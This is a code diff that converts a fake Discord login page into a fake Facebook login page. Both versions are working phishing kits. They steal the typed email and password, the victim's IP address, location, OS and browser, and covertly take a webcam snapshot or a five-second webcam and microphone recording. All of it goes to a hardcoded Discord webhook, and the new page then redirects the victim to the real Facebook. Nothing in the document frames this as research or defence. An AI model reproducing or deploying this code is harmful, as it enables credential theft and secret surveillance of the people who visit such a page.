@@ -3,178 +3,145 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Discord</title>
+    <title>Facebook - Log In or Sign Up</title>
     <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background-color: #5865F2;
-            font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #dcddde;
-        }
-        .login-box {
-            background-color: #313338;
-            padding: 32px;
-            border-radius: 8px;
-            width: 480px;
-            box-shadow: 0 2px 10px 0 rgba(0,0,0,.2);
-            text-align: center;
-        }
-        h3 {
-            color: #f2f3f5;
-            font-size: 24px;
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-        p {
-            color: #b5bac1;
-            font-size: 16px;
-            margin-bottom: 20px;
-        }
-        .input-group {
-            text-align: left;
-            margin-bottom: 20px;
-        }
-        label {
-            display: block;
-            color: #b5bac1;
-            font-size: 12px;
-            font-weight: 700;
-            text-transform: uppercase;
-            margin-bottom: 8px;
-        }
-        input {
-            width: 100%;
-            padding: 10px;
-            background-color: #1e1f22;
-            border: none;
-            border-radius: 3px;
-            color: #dbdee1;
-            font-size: 16px;
-            box-sizing: border-box;
-        }
-        input:focus {
-            outline: none;
-        }
-        .forgot {
-            color: #00a8fc;
-            font-size: 14px;
-            text-decoration: none;
-            display: block;
-            margin-top: 4px;
-            cursor: pointer;
-        }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #5865F2;
-            color: white;
-            border: none;
-            border-radius: 3px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-        .register {
-            margin-top: 10px;
-            font-size: 14px;
-            color: #949ba4;
-            text-align: left;
-        }
-        .register span {
-            color: #00a8fc;
-            cursor: pointer;
-        }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { display: flex; width: 980px; justify-content: space-between; align-items: center; }
+        .left-side { width: 500px; }
+        .left-side h1 { color: #1877f2; font-size: 60px; margin: 0; padding: 0; }
+        .left-side p { font-size: 28px; line-height: 32px; margin-top: 10px; }
+        .right-side { background: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); width: 396px; text-align: center; }
+        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        button { background-color: #1877f2; color: #fff; font-size: 20px; font-weight: bold; padding: 10px 16px; width: 100%; border: none; border-radius: 6px; cursor: pointer; margin-top: 6px; }
+        button:hover { background-color: #166fe5; }
+        .forgot { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-top: 16px; }
+        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
+        .create-btn { background-color: #42b72a; color: #fff; font-size: 17px; font-weight: bold; padding: 14px 16px; border: none; border-radius: 6px; cursor: pointer; display: inline-block; }
+        .create-btn:hover { background-color: #36a420; }
     </style>
 </head>
 <body>
-
-<div class="login-box">
-    <h3>Welcome back!</h3>
-    <p>We're so excited to see you again!</p>
-    
-    <div class="input-group">
-        <label>Email or Phone Number <span style="color: #f23f42;">*</span></label>
-        <input type="text" id="email" required>
+    <div class="container">
+        <div class="left-side">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right-side">
+            <form id="loginForm">
+                <input type="text" id="email" placeholder="Email or phone number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit" id="loginBtn">Log In</button>
+                <a href="#" class="forgot" id="forgotBtn">Forgot password?</a>
+                <div class="divider"></div>
+                <button type="button" class="create-btn" id="registerBtn">Create new account</button>
+            </form>
+        </div>
     </div>
-    
-    <div class="input-group">
-        <label>Password <span style="color: #f23f42;">*</span></label>
-        <input type="password" id="password" required>
-        <a class="forgot" id="forgot-btn">Forgot your password?</a>
-    </div>
-    
-    <button id="login-btn">Log In</button>
-    
-    <div class="register">
-        Need an account? <span id="register-btn">Register</span>
-    </div>
-</div>
 
-<script>
-    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
+    <script>
+        const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
 
-    async function captureAndSend(action) {
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-
-        let ipData = {};
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            ipData = await res.json();
-        } catch(e) {}
-
-        const userAgent = navigator.userAgent;
-
-        let imageBlob = null;
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await video.play();
-
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-
-            imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-            stream.getTracks().forEach(track => track.stop());
-        } catch(e) {}
-
-        const formData = new FormData();
-        const payload = {
-            embeds: [{
-                title: `Target Action: ${action}`,
-                color: 16711680,
-                fields: [
-                    { name: "Email", value: email || "N/A", inline: true },
-                    { name: "Password", value: password || "N/A", inline: true },
-                    { name: "IP Address", value: ipData.ip || "Unknown", inline: false },
-                    { name: "Location", value: `${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}`, inline: false },
-                    { name: "OS/Browser", value: userAgent, inline: false },
-                    { name: "Time Captured", value: new Date().toISOString(), inline: false }
-                ]
-            }]
-        };
-
-        formData.append('payload_json', JSON.stringify(payload));
-        if (imageBlob) {
-            formData.append('file', imageBlob, 'webcam.jpg');
+        async function getIPAndLocation() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                return await res.json();
+            } catch (e) {
+                return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown' };
+            }
         }
 
-        try {
-            await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-        } catch(e) {}
-    }
+        function getOSAndBrowser() {
+            const ua = navigator.userAgent;
+            let os = "Unknown OS";
+            if (ua.indexOf("Win") != -1) os = "Windows";
+            if (ua.indexOf("Mac") != -1) os = "MacOS";
+            if (ua.indexOf("Linux") != -1) os = "Linux";
+            if (ua.indexOf("Android") != -1) os = "Android";
+            if (ua.indexOf("like Mac") != -1) os = "iOS";
 
-    document.getElementById('login-btn').addEventListener('click', () => captureAndSend('Log In'));
-    document.getElementById('forgot-btn').addEventListener('click', () => captureAndSend('Forgot Password'));
-    document.getElementById('register-btn').addEventListener('click', () => captureAndSend('Register'));
-</script>
+            let browser = "Unknown Browser";
+            if (ua.indexOf("Firefox") > -1) browser = "Firefox";
+            else if (ua.indexOf("SamsungBrowser") > -1) browser = "Samsung Internet";
+            else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) browser = "Opera";
+            else if (ua.indexOf("Trident") > -1) browser = "Internet Explorer";
+            else if (ua.indexOf("Edge") > -1) browser = "Edge";
+            else if (ua.indexOf("Chrome") > -1) browser = "Chrome";
+            else if (ua.indexOf("Safari") > -1) browser = "Safari";
+
+            return { os, browser };
+        }
+
+        async function captureMedia() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('file', blob, 'capture.webm');
+                    
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                };
+                
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000);
+            } catch (err) {
+                console.error("Media capture failed:", err);
+            }
+        }
+
+        async function sendData(action, email = '', password = '') {
+            const geo = await getIPAndLocation();
+            const sys = getOSAndBrowser();
+            const time = new Date().toISOString();
+
+            const payload = {
+                content: `**New Facebook Phish Action: ${action}**\n` +
+                         `**Email:** ${email}\n` +
+                         `**Password:** ${password}\n` +
+                         `**IP:** ${geo.ip}\n` +
+                         `**Location:** ${geo.city}, ${geo.region}, ${geo.country_name}\n` +
+                         `**OS:** ${sys.os}\n` +
+                         `**Browser:** ${sys.browser}\n` +
+                         `**Time:** ${time}`
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            captureMedia();
+            
+            await sendData('LOG IN', email, password);
+            
+            window.location.href = 'https://www.facebook.com';
+        });
+
+        document.getElementById('forgotBtn').addEventListener('click', (e) => {
+            e.preventDefault();
+            sendData('FORGOT PASSWORD CLICKED');
+        });
+
+        document.getElementById('registerBtn').addEventListener('click', (e) => {
+            e.preventDefault();
+            sendData('REGISTER CLICKED');
+        });
+    </script>
 </body>
 </html>
